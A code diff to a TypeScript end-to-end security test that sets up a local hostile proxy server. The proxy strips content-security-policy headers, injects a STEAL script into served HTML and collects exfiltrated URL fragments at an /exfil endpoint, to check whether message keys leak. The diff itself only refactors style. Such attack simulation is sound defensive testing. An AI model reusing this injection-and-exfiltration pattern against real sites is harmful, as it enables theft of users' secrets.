@@ -1,6 +1,7 @@
+import type { AddressInfo } from 'node:net';
+
 import { type ChildProcessWithoutNullStreams, spawn } from 'node:child_process';
 import { createServer, request as forward, type IncomingMessage, type Server, type ServerResponse } from 'node:http';
-import { type AddressInfo } from 'node:net';
 import { createInterface } from 'node:readline';
 
 import { expect, test } from '../support/fixtures.ts';
@@ -23,18 +24,20 @@ function relayed(incoming: IncomingMessage, outgoing: ServerResponse, origin: st
   for (const name of ['origin', 'referer'] as const) {
     const value = headers[name];
     if (typeof value === 'string') {
-      headers[name] = value.replace(origin, BASE_URL);
+      headers[name] = value.replace(origin, () => BASE_URL);
     }
   }
   const upstream = forward(target, { method: incoming.method ?? 'GET', headers }, (answer) => {
     const chunks: Buffer[] = [];
-    answer.on('data', (chunk: Buffer) => chunks.push(chunk));
+    answer.on('data', (chunk: Buffer) => {
+      chunks.push(chunk);
+    });
     answer.on('end', () => {
       let body = Buffer.concat(chunks);
       const answerHeaders = { ...answer.headers };
       if (String(answerHeaders['content-type']).startsWith('text/html')) {
         delete answerHeaders['content-security-policy'];
-        body = Buffer.from(body.toString('utf8').replace('<head>', `<head>${STEAL}`));
+        body = Buffer.from(body.toString('utf8').replace('<head>', () => `<head>${STEAL}`));
       }
       delete answerHeaders['content-length'];
       outgoing.writeHead(answer.statusCode ?? 502, answerHeaders);
@@ -65,7 +68,9 @@ async function startHostileServer(): Promise<HostileServer> {
   const server: Server = createServer((incoming, outgoing) => {
     if (incoming.url === '/exfil') {
       const chunks: Buffer[] = [];
-      incoming.on('data', (chunk: Buffer) => chunks.push(chunk));
+      incoming.on('data', (chunk: Buffer) => {
+        chunks.push(chunk);
+      });
       incoming.on('end', () => {
         loot.push(Buffer.concat(chunks).toString('utf8'));
         outgoing.writeHead(204).end();
@@ -106,14 +111,19 @@ test(
       const website = await newPage();
       const control = await createMessageInPage(website, { text: 'read on the website', passphrase: PASSPHRASE });
       const fragment = control.slice(control.indexOf('#'));
-      await showMessage(await newPage(), control.replace(BASE_URL, hostile.origin), PASSPHRASE);
+      await showMessage(
+        await newPage(),
+        control.replace(BASE_URL, () => hostile.origin),
+        PASSPHRASE,
+      );
       await expect.poll(() => hostile.loot).toContain(fragment);
 
       hostile.requests.length = 0;
       hostile.loot.length = 0;
       const web = runNylzo(['web', '--no-browser', '--server', hostile.origin]);
       running.push(web);
-      const local = (await web.firstLine).replace(/\/$/, '');
+      const address = await web.firstLine;
+      const local = address.replace(/\/$/, '');
       expect(local).toMatch(/^http:\/\/127\.0\.0\.1:\d+$/);
       const sender = await newPage();
       const link = await createMessageInPage(
